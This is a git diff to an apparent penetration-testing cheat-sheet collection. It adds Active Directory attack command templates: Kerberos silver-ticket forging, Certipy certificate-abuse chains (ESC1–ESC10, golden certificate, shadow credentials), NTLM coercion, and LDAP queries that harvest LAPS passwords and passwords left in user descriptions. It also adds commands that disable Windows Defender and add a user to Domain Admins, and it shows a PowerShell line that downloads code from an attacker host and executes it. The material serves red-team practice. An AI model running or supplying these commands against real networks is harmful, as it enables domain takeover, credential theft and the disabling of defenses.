@@ -1,0 +1,262 @@
+diff --git a/arsenal/data/cheats/Active_directory/Impacket/impacket-kerberos.md b/arsenal/data/cheats/Active_directory/Impacket/impacket-kerberos.md
+index 618d8c3..eca9dcd 100644
+--- a/arsenal/data/cheats/Active_directory/Impacket/impacket-kerberos.md
++++ b/arsenal/data/cheats/Active_directory/Impacket/impacket-kerberos.md
+@@ -32,6 +32,12 @@ goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
+ ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
+ ```
+ 
++## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
++#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
++```
++ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
++```
++
+ ## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
+ #plateform/linux #target/local  #cat/UTILS
+ ```
+diff --git a/arsenal/data/cheats/Active_directory/certipy.md b/arsenal/data/cheats/Active_directory/certipy.md
+index f7ca4bf..1a10629 100644
+--- a/arsenal/data/cheats/Active_directory/certipy.md
++++ b/arsenal/data/cheats/Active_directory/certipy.md
+@@ -5,78 +5,84 @@
+ ## certipy - list certificate templates
+ #plateform/linux #target/remote #cat/RECON
+ ```
+-certipy find <domain>/<user>:'<password>'@<dc-ip> 
++certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
+ ```
+ 
+ ## certipy - request certificate
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority>
++certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority>
+ ```
+ 
+-## certipy - request previously issued certificate
+-#plateform/linux #target/remote #cat/ATTACK
++## certipy - authenticate with pfx certificate
++#plateform/linux #target/remote #cat/CONNECT
+ ```
+-certipy req <domain>/<user>:'<password>'@<ca-ip> -retrieve <csr-id> -ca <certificate-authority>
++certipy auth -pfx <pfx-file> 
+ ```
+ 
+-## certipy - authenticate with pfx certificate
++## certipy - authenticate through LDAP (Schannel) with pfx certificate
+ #plateform/linux #target/remote #cat/CONNECT
+ ```
+-certipy auth -pfx <pfx-file>
++certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
+ ```
+ 
+ ## certipy - Golden Certificate - steal CA certificate and private key
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy ca <domain>/<user>:'<password>'@<ca-ip> -backup
++certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority> -target-ip <ca-ip>
+ ```
+ 
+ ## certipy - Golden Certificate - forge certificate
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy forge -ca-pfx <pfx-file> -alt <targeted-user>
++certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
+ ```
+ 
+ ## certipy - request certificate for another user - ESC1 - ESC6
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority> -alt <targeted-user>
++certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
+ ```
+ 
+ ## certipy - request certificate on behalf of with Certificate Request Agent certificate - ESC3
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy req <domain>/<user>:'<password>'@<ca-ip> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
++certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
+ ```
+ 
+ ## certipy - modify template in order to make it vulnerable to ESC1 - ESC4
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy template <domain>/<user>:'<password>'@<ca-ip> -template <template> -save-old
++certipy template -u <user>@<domain> -p '<password>' -template <template> -save-old
+ ```
+ 
+ ## certipy - Issue certificate for specific request id - ESC7
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy ca <domain>/<user>:'<password>'@<ca-ip> -ca <certificate-authority> -issue-request <csr-id>
++certipy ca -u <user>@<domain> -p '<password>' -ca <certificate-authority> -issue-request <csr-id>
+ ```
+ 
+ ## certipy - relay authentication to CA Web Enrollment - ESC8
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy relay -ca <ca-ip>
++certipy relay -ca <ca-fqdn>
+ ```
+ 
+ ## certipy - relay domain controller authentication to CA Web Enrollment - ESC8
+ #plateform/linux #target/remote #cat/ATTACK
+ ```
+-certipy relay -ca <ca-ip> -template 'DomainController'
++certipy relay -ca <ca-fqdn> -template 'DomainController'
++```
++
++## certipy - Modify user upn to another one - ESC9 - ESC10
++#plateform/linux #target/remote #cat/ATTACK
++```
++certipy account update -u <user>@<domain> -p '<password>' -user <targeted-user> -upn <administrator-user>
+ ```
+ 
+ ## certipy - Get NT hash - Shadow Credential
+ #plateform/linux #target/remote #cat/ATTACK
+ Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
+ ```
+-certipy shadow auto <domain>/<user>:'<password>'@<dc-ip> -account <targeted-user>
++certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
+ ```
+\ No newline at end of file
+diff --git a/arsenal/data/cheats/Active_directory/machine_account_coerce_abuse.md b/arsenal/data/cheats/Active_directory/machine_account_coerce_abuse.md
+index a514587..20e543b 100644
+--- a/arsenal/data/cheats/Active_directory/machine_account_coerce_abuse.md
++++ b/arsenal/data/cheats/Active_directory/machine_account_coerce_abuse.md
+@@ -44,6 +44,13 @@ https://github.com/topotam/PetitPotam
+ PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
+ ```
+ 
++## Coercer
++#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
++https://github.com/p0dalirius/Coercer
++```
++PetitPotam.py -u <user> -p '<password>' -d <domain> -l <listener> -t <target-ip>
++```
++
+ ## ntlmrelayx add computer
+ #plateform/linux  #target/remote #cat/ATTACK/MITM 
+ ```
+diff --git a/arsenal/data/cheats/Protocol/ldap.md b/arsenal/data/cheats/Protocol/ldap.md
+index 5d8340a..e04d584 100644
+--- a/arsenal/data/cheats/Protocol/ldap.md
++++ b/arsenal/data/cheats/Protocol/ldap.md
+@@ -11,29 +11,53 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <ip>
+ ## ldapsearch base
+ #cat/ATTACK/CONNECT 
+ ```
+-ldapsearch -x -h <ip> -s base
++ldapsearch -x -H ldap://<dc_fqdn> -s base
+ ```
+ 
+ ## ldapsearch SPN
+ #cat/ATTACK/CONNECT 
+ ```
+-ldapsearch -Y GSSAPI -H ldap://<dc_fqdn> -D "<user>" -W -b "dc=<domain_name>,dc=com" "servicePrincipalName=*" servicePrincipalName
++ldapsearch -Y GSSAPI -H ldap://<dc_fqdn> -D "<user>" -W -b "dc=<domain>,dc=<path>" "servicePrincipalName=*" servicePrincipalName
+ ```
+ 	
+ ## ldapsearch with base dn
+ #cat/ATTACK/CONNECT 
+ ```
+-ldapsearch -x -h <ip> -b <basedn>
++ldapsearch -x -H ldap://<dc_fqdn> -b <basedn>
+ ```
+ 
+ ## ldapsearch base with authentication
+ #cat/ATTACK/CONNECT 
+ ```
+-ldapsearch -x -h <ip> -D <domain>\\<username> -w <password> -b 'DC=<domain>,DC=<path>'
++ldapsearch -x -H ldap://<dc_fqdn> -D <domain>\\<username> -w '<password>' -b 'DC=<domain>,DC=<path>'
++```
++
++## ldapsearch - list all users
++#cat/ATTACK/CONNECT 
++```
++ldapsearch -x -H ldap://<dc_fqdn> -D <domain>\\<username> -w '<password>' -b 'DC=<domain>,DC=<path>' '(&(objectCategory=person)(objectClass=user))'
++```
++
++## ldapsearch - list all users protected by adminCount
++#cat/ATTACK/CONNECT 
++```
++ldapsearch -x -H ldap://<dc_fqdn> -D <domain>\\<username> -w '<password>' -b 'DC=<domain>,DC=<path>' '(&(objectCategory=user)(adminCount=1))'
++```
++
++## ldapsearch - list all users with password, pass, identifiant or pwd in their description
++#cat/ATTACK/CONNECT 
++```
++ldapsearch -x -H ldap://<dc_fqdn> -D <domain>\\<username> -w '<password>' -b 'DC=<domain>,DC=<path>' '(&(objectCategory=user)(|(description=*pass*)(description=*password*)(description=*identifiant*)(description=*pwd*)))'
++```
++
++## ldapsearch - list all computer with laps enabled and corresponding laps password if able
++#cat/ATTACK/CONNECT 
++```
++ldapsearch -x -H ldap://<dc_fqdn> -D <domain>\\<username> -w '<password>' -b 'DC=<domain>,DC=<path>' '(ms-Mcs-AdmPwdExpirationtime=*)' ms-Mcs-AdmPwd
+ ```
+ 
+ ## ldapdomaindump
+ #cat/ATTACK/CONNECT 
+ ```
+-ldapdomaindump --no-json --no-grep --authtype SIMPLE -o ldap_dump -r <ip> -u <domain>\\<username> -p <password>
++ldapdomaindump --no-json --no-grep --authtype SIMPLE -o ldap_dump -r <ip> -u <domain>\\<username> -p '<password>'
+ ```
+\ No newline at end of file
+diff --git a/arsenal/data/cheats/Wifi/wifi.md b/arsenal/data/cheats/Wifi/wifi.md
+index fdfc0c2..b2a84c9 100644
+--- a/arsenal/data/cheats/Wifi/wifi.md
++++ b/arsenal/data/cheats/Wifi/wifi.md
+@@ -62,6 +62,16 @@ nmcli device set <wlan_interface> managed true
+ reaver -i <wlanmon_interface> -b <mac_address> -c <channel> -Z
+ ```
+ 
++## hcxdumptool - WPA2-PSK PMKID Capture
++```
++hcxdumptool -i <wlanmon_interface> -o capture.pcapng --enable_status=1 -c <channel>
++```
++
++## hcxdumptool - 
++```
++hcxpcaptool -z test.16800 test.pcapng
++```
++
+ = wlan_interface: wlan0
+ = wlanmon_interface: wlan0mon
+ = deauth_count: 5
+diff --git a/arsenal/data/cheats/Windows/powershell.md b/arsenal/data/cheats/Windows/powershell.md
+index a63c935..a0942a9 100644
+--- a/arsenal/data/cheats/Windows/powershell.md
++++ b/arsenal/data/cheats/Windows/powershell.md
+@@ -127,4 +127,9 @@ $proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\Curren
+ 
+ ```powershell
+ pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
++```
++
++## powershell - disable Real Time Monitoring (Windows Defender)
++```powershell
++Set-MpPreference -DisableRealtimeMonitoring $true
+ ```
+\ No newline at end of file
+diff --git a/arsenal/data/cheats/Windows/windows.md b/arsenal/data/cheats/Windows/windows.md
+index 08f3878..1dfffa1 100644
+--- a/arsenal/data/cheats/Windows/windows.md
++++ b/arsenal/data/cheats/Windows/windows.md
+@@ -352,6 +352,16 @@ net group "Domain Controllers" /domain
+ net group "Domain Admins" /domain
+ ```
+ 
++## Add user to domain admin group
++```
++net group "Domain Admins" <username> /add /domain
++```
++
++## Add user to domain admin group - FR
++```
++net group "Admins du domaine" <username> /add /domain
++```
++
+ ## List users that belongs to the administrators group inside the domain
+ ```
+ net localgroup administrators /domain
